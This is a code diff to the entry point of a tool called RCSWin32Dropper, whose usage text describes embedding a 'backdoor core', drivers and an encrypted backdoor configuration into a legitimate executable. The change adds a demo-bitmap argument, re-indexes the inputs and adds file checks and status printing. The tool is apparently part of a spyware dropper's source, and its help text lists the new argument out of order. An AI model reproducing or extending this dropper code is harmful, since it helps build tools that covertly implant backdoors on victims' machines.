@@ -31,9 +31,9 @@ int main(int argc, char* argv[])
 	memset(&MS, 0, sizeof(MelterStruct));
 	MS.manifest = false;
 	
-	if (argc != 12) {
+	if (argc != 13) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <prefix> <input> <output>\n\n");
+		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <prefix> <demo_bitmap> <input> <output>\n\n");
 		printf("  <core> is the backdoor core\n");
 		printf("  <core64> is the 64 bit backdoor core\n");
 		printf("  <conf> is the backdoor encrypted configuration\n");
@@ -44,6 +44,7 @@ int main(int argc, char* argv[])
 		printf("  <manifest> is a boolean flag for modifying the manifest\n");
 		printf("  <prefix> is the core exported function(s) name prefix\n");
 		printf("  <input> is the exe to be melted\n");
+		printf("  <demo_bitmap> is the bitmap for demo version\n");
 		printf("  <output> is the output file\n\n");
 		return 0;
 	}
@@ -75,6 +76,11 @@ int main(int argc, char* argv[])
 	if (strcmp(argv[6], "null")) {
 		sprintf(MS.codec, "%s", argv[6]);
 	}
+
+	if (strcmp(argv[10], "null")) {
+		sprintf(MS.demoBitmap, "%s", argv[10]);
+	}
+
 	printf("Instdir = %s\n", argv[7]);
 	sprintf(MS.instdir, "%s", argv[7]);
 
@@ -87,8 +93,9 @@ int main(int argc, char* argv[])
 	bf::path driverFile = MS.driver;
 	bf::path driver64File = MS.driver64;
 	bf::path codecFile = MS.codec;
-	bf::path exeFile = argv[10];
-	bf::path outputFile = argv[11];
+	bf::path bitmapFile = MS.demoBitmap;
+	bf::path exeFile = argv[11];
+	bf::path outputFile = argv[12];
 
 	_snprintf(MS.fprefix, 6, "%s", argv[9]);
 	printf("Function Prefix: %s\n", MS.fprefix);
@@ -139,7 +146,15 @@ int main(int argc, char* argv[])
 			return ERROR_EMBEDDING;
 		}
 	}
-	
+
+	if (MS.demoBitmap[0]) {
+		if ( !bf::exists(bitmapFile) ) {
+			cout << "Cannot find the demo bitmap file [" << bitmapFile << "]" << endl;
+			return ERROR_EMBEDDING;
+		}
+	}
+
+
 	/************************************************************************/
 	/*  READY TO GO                                                         */
 	/************************************************************************/
@@ -153,6 +168,7 @@ int main(int argc, char* argv[])
 	printf("DRIVER (64 bit) [%s]\n", (MS.driver64) ? MS.driver64 : "none");
 	printf("CODEC           [%s]\n", (MS.codec) ? MS.codec : "none");
 	printf("MANIFEST        [%d]\n", MS.manifest);
+	printf("DEMO BITMAP		[%s]\n", (MS.demoBitmap) ? MS.demoBitmap : "none");
 	cout << "INPUT          [" << exeFile << "]" << endl;
 	cout << "OUTPUT         [" << outputFile << "]" << endl << endl;
 	
